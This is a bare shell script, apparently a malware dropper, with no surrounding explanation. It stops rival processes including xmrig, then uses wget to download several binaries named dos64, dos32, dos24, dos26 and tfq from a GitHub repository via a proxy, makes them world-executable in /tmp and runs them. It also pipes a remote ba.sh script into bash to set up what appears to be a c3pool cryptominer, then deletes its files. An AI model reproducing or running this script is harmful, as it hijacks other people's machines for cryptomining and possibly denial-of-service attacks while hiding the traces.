killall dos64
killall dos32
killall xmrig
rm -rf cd /tmp/dos64
rm -rf cd /tmp/dos32
if [ ! -w "/tmp/dos64" ]; then
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos64;chmod 777 dos64;./dos64
fi

if [ ! -w "/tmp/dos32" ]; then
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos32;chmod 777 dos32;./dos32
fi

if [ ! -w "/tmp/dos24" ]; then
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos24;chmod 777 dos24;./dos24
fi

if [ ! -w "/tmp/dos26" ]; then
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/dos26;chmod 777 dos26;./dos26
fi

if [ ! -w "/tmp/tfq" ]; then
    cd /tmp;wget https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/tfq;chmod 777 tfq;./tfq
fi

if [ ! -w "/root/c3pool/xmrig" ]; then
    curl -s -L https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/ba.sh | bash -s
fi
rm -rf cd /tmp/dos64
rm -rf cd /tmp/dos32
sleep 60;rm -rf cd /root/c3pool
